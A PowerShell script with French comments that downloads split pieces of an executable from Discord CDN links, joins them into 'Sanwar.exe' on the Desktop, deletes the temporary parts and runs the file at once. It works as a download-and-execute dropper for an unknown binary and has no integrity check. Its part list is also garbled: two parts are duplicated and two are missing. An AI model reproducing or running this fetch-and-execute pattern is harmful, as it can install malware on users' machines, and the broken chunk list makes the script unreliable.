# Récupère les différentes parties d'un fichier depuis des liens Discord (ou autres URLs)
# Assemble les fichiers en un fichier final, et exécute ce fichier si besoin.

$urls = @(
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367731099734037/client1.exe.part1?ex=6782cf08&is=67817d88&hm=d0394a908263e500d6107415c5d0368bc9ac6c0dfb226dbbd2a0e140616a6de5&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367731485347980/client1.exe.part2?ex=6782cf08&is=67817d88&hm=14fa862159a6c0d58927524b0d6ccdc6cfb2dfa14ae1a999319c3aefbdd2fbd3&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367731976208444/client1.exe.part3?ex=6782cf08&is=67817d88&hm=881187442b03feb34391ec5770597c0a1b83cd145230439c4187d703a9fadebf&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367732416479404/client1.exe.part4?ex=6782cf08&is=67817d88&hm=13d567aded517f1fdd1bc39be93313bd30597bd6a9bb39cf8ac95008f4494f85&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367994757877770/client1.exe.part8?ex=6782cf47&is=67817dc7&hm=52808651ae69213b0606918e6af4e0ea7e48dde3a5f145a50d61394c4ada9968&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367995651260548/client1.exe.part6?ex=6782cf47&is=67817dc7&hm=e721661f715bc18246af09cfc437d5405dad5f21147ff40648195711d4d03eb3&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367996150382632/client1.exe.part7?ex=6782cf47&is=67817dc7&hm=f40fd1f1815c254e7e7fbddacc6d3819a65b03c38847b75139d1d85d2c88f9a8&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327367994757877770/client1.exe.part8?ex=6782cf47&is=67817dc7&hm=52808651ae69213b0606918e6af4e0ea7e48dde3a5f145a50d61394c4ada9968&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327368347259633684/client1.exe.part10?ex=6782cf9b&is=67817e1b&hm=a248b34a11fe5481e13312d9ec04a385b4fef2b468d0f461924febcae38c46ea&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327368347259633684/client1.exe.part10?ex=6782cf9b&is=67817e1b&hm=a248b34a11fe5481e13312d9ec04a385b4fef2b468d0f461924febcae38c46ea&",
    "https://cdn.discordapp.com/attachments/1322302700402245632/1327368347720880248/client1.exe.part11?ex=6782cf9b&is=67817e1b&hm=dff4a0399f16365e9b76bac1b14919dbac0fbefa044f3921bdb18cc892b5e878&"
)

# Nom du fichier final après assemblage
$outputFile = "$env:USERPROFILE\Desktop\Sanwar.exe"

# Nom des fichiers temporaires
$tempFiles = @()

# Téléchargement des parties
Write-Host "Téléchargement des parties..."
foreach ($index in 0..($urls.Count - 1)) {
    $url = $urls[$index]
    $tempFile = "$env:TEMP\part$($index + 1).tmp"
    $tempFiles += $tempFile

    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
        Write-Host "Téléchargé : $url"
    } catch {
        Write-Host "Erreur lors du téléchargement : $url"
        exit 1
    }
}

# Assemblage des parties
Write-Host "Assemblage des fichiers..."
Try {
    $fs = [System.IO.File]::Create($outputFile)
    foreach ($tempFile in $tempFiles) {
        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
        $fs.Write($bytes, 0, $bytes.Length)
    }
    $fs.Close()
    Write-Host "Fichier assemblé : $outputFile"
} catch {
    Write-Host "Erreur lors de l'assemblage des fichiers."
    exit 1
}

# Suppression des fichiers temporaires
Write-Host "Suppression des fichiers temporaires..."
foreach ($tempFile in $tempFiles) {
    Remove-Item -Path $tempFile -Force
}

# Exécution du fichier final
Write-Host "Exécution du fichier assemblé..."
Start-Process $outputFile
